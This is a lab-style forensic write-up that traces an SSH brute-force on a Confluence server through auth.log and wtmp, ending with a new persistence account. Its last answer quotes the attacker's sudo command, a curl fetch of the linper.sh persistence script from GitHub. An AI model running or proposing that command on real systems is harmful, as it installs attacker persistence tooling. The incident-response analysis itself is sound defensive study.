# Sherlock Scenario

investigation, we will explore Unix `auth.log` and `wtmp` logs to track an attack on a Confluence server. The attacker brute-forced SSH access and performed additional activities, which we will analyze through log artifacts. Although `auth.log` is primarily used for brute-force analysis, we will investigate its potential in identifying privilege escalation, persistence, and command execution.

## 1. Attacker's IP Address

**Question:** What is the IP address used by the attacker to carry out the brute-force attack?

By analyzing `auth.log`, we can observe multiple failed SSH attempts originating from the attacker's IP address.

![Screenshot from 2025-02-26 14-09-44](https://github.com/user-attachments/assets/b68cffa3-f966-4c42-8478-3730370c2fb3)


**Answer:** `65.2.161.68`

---

## 2. Attacker's Accessed Username

**Question:** What is the username of the account that the attacker successfully accessed?

Upon reviewing the logs, we can see successful SSH access attempts aimed at gaining `root` privileges.

![Screenshot from 2025-02-26 14-09-44](https://github.com/user-attachments/assets/95f33114-9f64-4cca-9afc-cf6ab7ff09f2)


**Answer:** `root`

---

## 3. Attacker's Login Timestamp

**Question:** Identify the timestamp when the attacker manually logged into the server.

By checking both `auth.log` and `wtmp`, we can determine the exact login time using the `utmpdump` command:

```sh
utmpdump wtmp
```

From the logs, we confirm that the attacker successfully logged in at:

![Screenshot from 2025-02-26 14-12-13](https://github.com/user-attachments/assets/f328905f-cc47-4726-b592-f979e1c1884a)


**Answer:** `2024-03-06 06:32:45`

---

## 4. Attacker's Session Number

**Question:** What is the session number assigned to the attacker's SSH session?

The session ID assigned upon login can be identified in the logs. The attacker's session number was:

![Screenshot from 2025-02-26 14-40-23](https://github.com/user-attachments/assets/e972b665-7641-4cf1-8f3b-c85a5b978da1)


**Answer:** `37`

---

## 5. Attacker's Persisting User Account

**Question:** What is the name of the new user account created by the attacker for persistence?

By using the `grep` command to search for user creation events in `auth.log`, we find that the attacker created a new user:

```sh
grep -iE "new user" auth.log
```
![Screenshot from 2025-02-26 14-21-23](https://github.com/user-attachments/assets/e194b4ea-3cc8-44b7-9a3c-00781ea01fb3)


**Answer:** `cyberjunkie`

---

## 6. MITRE ATT&CK Sub-Technique ID

**Question:** What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

MITRE ATT&CK is a framework that categorizes attack techniques. The sub-technique for creating a new user account for persistence is:

![Screenshot from 2025-02-26 14-33-33](https://github.com/user-attachments/assets/63f34294-f818-4e3a-82ed-4e195dd4fcdb)

**Answer:** `T1136.001`

[MITRE ATTACKer](https://attack.mitre.org/)
---

## 7. Attacker's First SSH Session End Time

**Question:** What time did the attacker's first SSH session end according to `auth.log`?

Since we already identified session ID `37`, we can filter for session termination events:

```sh
grep -iE "session 37" auth.log
```
![Screenshot from 2025-02-26 14-40-23](https://github.com/user-attachments/assets/d3079449-22d2-46f9-a336-267bd8ccabc4)


The attacker's first session ended at:

**Answer:** `2024-03-06 06:37:24`

---

## 8. Command Executed by the Attacker via Sudo

**Question:** What is the full command executed by the attacker using sudo?

By searching `auth.log` for activity related to the `cyberjunkie` account:

```sh
grep -iE "cyberjunkie" auth.log
```
![Screenshot from 2025-02-26 14-44-35](https://github.com/user-attachments/assets/a54b0e53-0060-4b11-9af4-82c1c2e1d5a8)


We found that the attacker used `curl` to download a script:

**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

---


